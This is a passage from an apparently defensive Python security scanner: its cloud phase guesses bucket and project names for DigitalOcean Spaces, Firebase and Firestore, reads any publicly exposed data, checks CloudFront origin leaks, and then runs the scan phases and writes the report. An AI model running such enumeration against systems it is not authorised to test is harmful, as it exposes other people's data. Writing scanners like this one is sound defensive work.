                        print(f"\n{CRITICAL} Public DO Space Discovered (Listable): {space_url}")
                        found_any = True
                        
                        file_keys = re.findall(r'<Key>(.*?)</Key>', response.text)
                        
                        finding = Finding(
                            "Public DigitalOcean Space (Listable)",
                            f"DigitalOcean Space '{bucket_name}' in region '{region}' allows public directory listing.",
                            RiskRating.CRITICAL,
                            "1. Disable directory listing on the Space.\n"
                            "    2. Restrict access using Space-level ACLs.\n"
                            "    3. Use signed URLs for controlled file access.",
                            "Cloud"
                        )
                        if file_keys:
                            finding.add_evidence(f"Sample files: {', '.join(file_keys[:5])}")
                        finding.add_evidence(f"URL: {space_url}")
                        self.report.add_finding(finding)
                        break  # Found in this region, skip other regions for this name
                        
                except:
                    pass
                finally:
                    progress.update()
        
        if not found_any:
            print(f"\n{SUCCESS} No publicly listable DigitalOcean Spaces found")
    
    # ---- Firebase ----
    def check_firebase_db(self):
        """Check for exposed Firebase Realtime Databases"""
        print(f"\n{INFO} Checking for exposed Firebase Realtime Databases")
        
        firebase_names = [
            self.base_name,
            f"{self.base_name}-app",
            f"{self.base_name}-prod",
            f"{self.base_name}-dev",
            f"{self.base_name}-staging",
            f"{self.base_name}-api",
            f"{self.base_name}-web",
            f"{self.base_name}-default-rtdb",
        ]
        
        found_any = False
        
        for fb_name in firebase_names:
            firebase_url = f"https://{fb_name}.firebaseio.com/.json"
            try:
                time.sleep(0.1)
                response = self.session.get(firebase_url, timeout=5)
                
                if response.status_code == 200:
                    # Check if it returns actual data (not "null")
                    try:
                        data = response.json()
                        if data is not None:
                            # Firebase DB is open and has data
                            data_preview = str(data)[:200]
                            print(f"{CRITICAL} Open Firebase Database: https://{fb_name}.firebaseio.com")
                            found_any = True
                            
                            finding = Finding(
                                "Firebase Realtime Database Exposed",
                                f"Firebase database '{fb_name}' is publicly readable without authentication. "
                                f"This can expose user data, API keys, and application secrets.",
                                RiskRating.CRITICAL,
                                "1. Set Firebase Security Rules to restrict read/write access.\n"
                                "    2. Require authentication for all database operations.\n"
                                "    3. Audit exposed data for sensitive information.\n"
                                "    4. Rotate any exposed API keys or secrets.",
                                "Cloud"
                            )
                            finding.add_evidence(f"URL: https://{fb_name}.firebaseio.com/.json")
                            finding.add_evidence(f"Data preview: {data_preview}")
                            self.report.add_finding(finding)
                    except (json.JSONDecodeError, ValueError):
                        pass
                        
                elif response.status_code == 401:
                    # Database exists but requires auth — that's good
                    if self.verbose:
                        print(f"{SUCCESS} Firebase DB exists but requires auth: {fb_name}")
                        
            except:
                pass
        
        # Also check for Firestore REST endpoint
        for fb_name in firebase_names[:4]:
            firestore_url = f"https://firestore.googleapis.com/v1/projects/{fb_name}/databases/(default)/documents"
            try:
                response = self.session.get(firestore_url, timeout=5)
                if response.status_code == 200:
                    print(f"{CRITICAL} Open Firestore Database: {fb_name}")
                    found_any = True
                    
                    finding = Finding(
                        "Firestore Database Exposed",
                        f"Firestore database for project '{fb_name}' is publicly readable.",
                        RiskRating.CRITICAL,
                        "1. Set Firestore Security Rules to deny unauthorized access.\n"
                        "    2. Require authentication for document reads.\n"
                        "    3. Audit all collections for sensitive data.",
                        "Cloud"
                    )
                    finding.add_evidence(f"URL: {firestore_url}")
                    self.report.add_finding(finding)
            except:
                pass
        
        if not found_any:
            if self.verbose:
                print(f"{SUCCESS} No exposed Firebase databases found")
    
    # ---- CloudFront ----
    def check_cloudfront_misconfig(self):
        """Check for CloudFront misconfigurations that leak origin server info"""
        print(f"\n{INFO} Checking for CloudFront / CDN Misconfigurations")
        
        try:
            # Check if target uses CloudFront
            response = self.session.get(
                f"https://{self.domain}" if not self.domain.startswith('http') else self.domain,
                timeout=10,
                allow_redirects=True
            )
            
            headers = response.headers
            is_cloudfront = 'cloudfront' in headers.get('Server', '').lower() or \
                           'cloudfront' in headers.get('Via', '').lower() or \
                           'x-amz-cf-id' in headers or \
                           'x-amz-cf-pop' in headers
            
            if is_cloudfront:
                print(f"{INFO} CloudFront CDN detected")
                
                # Check 1: Origin header leak via error pages
                try:
                    error_url = f"https://{self.domain}/asat-cf-test-{int(time.time())}"
                    error_resp = self.session.get(error_url, timeout=5)
                    
                    # Look for origin server info in error responses
                    origin_indicators = re.findall(
                        r'(?:https?://[\w.-]+\.(?:amazonaws|elasticbeanstalk|s3|compute|ec2)\.[\w.-]+)',
                        error_resp.text
                    )
                    
                    if origin_indicators:
                        print(f"{WARNING} CloudFront error page leaks origin server info")
                        finding = Finding(
                            "CloudFront Origin Server Information Leak",
                            f"CloudFront error pages expose the origin server address, "
                            f"allowing attackers to bypass CDN protections.",
                            RiskRating.MEDIUM,
                            "1. Configure custom error pages in CloudFront.\n"
                            "    2. Restrict direct access to origin server via Security Groups.\n"
                            "    3. Use Origin Access Control (OAC) for S3 origins.",
                            "Cloud"
                        )
                        for origin in origin_indicators[:3]:
                            finding.add_evidence(f"Leaked origin: {origin}")
                        self.report.add_finding(finding)
                except:
                    pass
                
                # Check 2: Missing security headers from CloudFront
                if 'Strict-Transport-Security' not in headers:
                    print(f"{WARNING} CloudFront distribution missing HSTS header")
                    finding = Finding(
                        "CloudFront Missing HSTS",
                        "CloudFront distribution does not set Strict-Transport-Security header.",
                        RiskRating.MEDIUM,
                        "Add HSTS header via CloudFront Response Headers Policy.",
                        "Cloud"
                    )
                    self.report.add_finding(finding)
                
                # Check 3: Insecure TLS policy
                cf_tls = headers.get('X-Amz-Cf-Pop', '')
                if cf_tls and self.verbose:
                    print(f"{INFO} CloudFront POP: {cf_tls}")
                    
            else:
                # Check for other CDNs
                cdn_headers = {
                    'cf-ray': 'Cloudflare',
                    'x-fastly-request-id': 'Fastly',
                    'x-served-by': 'Fastly/Varnish',
                    'x-cdn': 'Generic CDN',
                    'x-akamai-transformed': 'Akamai',
                }
                
                detected_cdn = None
                for header_key, cdn_name in cdn_headers.items():
                    if header_key in headers:
                        detected_cdn = cdn_name
                        break
                
                if detected_cdn:
                    print(f"{INFO} CDN detected: {detected_cdn}")
                else:
                    if self.verbose:
                        print(f"{INFO} No CDN/CloudFront detected")
                        
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} CloudFront check failed: {str(e)}")

# ==================== MAIN APPLICATION ====================
class SecurityAssessmentTool:
    """Main application class"""
    
    def __init__(self):
        self.args = None
        self.report = None
        self.start_time = time.time()
        
    def parse_arguments(self):
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(
            description='Advanced Security Assessment Tool - Multi-phase automated security scanner',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog='''
Examples:
  %(prog)s -t example.com --all
  %(prog)s -t 192.168.1.1 --phase 1 -o report.txt
  %(prog)s -t example.com --phase 2 --phase 3 -v
            '''
        )
        
        parser.add_argument('-t', '--target', required=True,
                          help='Target domain or IP address')
        
        parser.add_argument('--phase', type=int, choices=[1, 2, 3, 4, 5], action='append',
                          help='Scan phase to run (1=Network, 2=Subdomain, 3=Web, 4=API, 5=Cloud). Can be specified multiple times.')
        
        parser.add_argument('--all', action='store_true',
                          help='Run all scan phases')
        
        parser.add_argument('-o', '--output',
                          help='Output file for report (if not specified, generates timestamped file)')
        
        parser.add_argument('--format', choices=['txt', 'json'], default='txt',
                          help='Report format (default: txt)')
        
        parser.add_argument('-v', '--verbose', action='store_true',
                          help='Enable verbose output')
        
        parser.add_argument('--no-banner', action='store_true',
                          help='Suppress banner display')
        
        self.args = parser.parse_args()
        
        # Validate arguments
        if not self.args.phase and not self.args.all:
            parser.error("Either --phase or --all must be specified")
    
    def setup(self):
        """Setup the scanning environment"""
        if not self.args.no_banner:
            print(BANNER)
        
        # Create report
        self.report = Report(self.args.target)
        
        print(f"{INFO} Target: {self.args.target}")
        print(f"{INFO} Start Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{INFO} Verbose Mode: {'ON' if self.args.verbose else 'OFF'}")
        print("-" * 60)
    
    def run_phase1(self):
        """Run network scan phase"""
        scanner = NetworkScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
    
    def run_phase2(self):
        """Run subdomain scan phase"""
        scanner = SubdomainScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
    
    def run_phase3(self):
        """Run web application scan phase"""
        scanner = WebScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
        
    def run_phase4(self):
        """Run API security scan phase"""
        scanner = APIScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
        
    def run_phase5(self):
        """Run Cloud infrastructure scan phase"""
        scanner = CloudScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
    
    def generate_report(self):
        """Generate and save the final report"""
        print(f"\n{INFO} Generating Final Report...")
        
        # Determine output filename
        if self.args.output:
            filename = self.args.output
        else:
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_target = re.sub(r'[^\w\.-]', '_', self.args.target)[:50]
            filename = f"asat_report_{safe_target}_{timestamp}.{self.args.format}"
        
        # Generate report content
        if self.args.format == 'json':
            report_content = self.report.generate_json_report()
        else:
            report_content = self.report.generate_text_report()
        
        # Save to file
        try:
            with open(filename, 'w') as f:
                f.write(report_content)
            print(f"{SUCCESS} Report saved to: {filename}")
        except Exception as e:
            print(f"{CRITICAL} Failed to save report: {str(e)}")
        
        # Print summary
        print(f"\n{SUCCESS} Scan completed in {time.time() - self.start_time:.2f} seconds")
        print(f"{INFO} Findings Summary:")
        for risk, count in self.report.scan_summary.items():
            color = RiskRating.color(risk)
            print(f"  {color}{risk}: {count}{Style.RESET_ALL}")
    
    def run(self):
        """Main execution method"""
        try:
            self.parse_arguments()
            self.setup()
            
            # Determine which phases to run
            phases_to_run = []
            if self.args.all:
                phases_to_run = [1, 2, 3, 4, 5]
            else:
                phases_to_run = self.args.phase
            
            # Run selected phases
            for phase in phases_to_run:
                if phase == 1:
                    self.run_phase1()
                elif phase == 2:
                    self.run_phase2()
                elif phase == 3:
                    self.run_phase3()
                elif phase == 4:
                    self.run_phase4()
                elif phase == 5:
                    self.run_phase5()
                
                # Add separator between phases
                if len(phases_to_run) > 1 and phase != phases_to_run[-1]:
                    print("\n" + "=" * 60 + "\n")
            
            # Generate final report
            self.generate_report()
            
        except KeyboardInterrupt:
            print(f"\n{WARNING} Scan interrupted by user")
            sys.exit(0)
        except Exception as e:
            print(f"\n{CRITICAL} Unexpected error: {str(e)}")
            if self.args.verbose:
                import traceback
                traceback.print_exc()
            sys.exit(1)

# ==================== ENTRY POINT ====================
def main():
    """Main entry point"""
    tool = SecurityAssessmentTool()
    tool.run()

if __name__ == "__main__":
    main()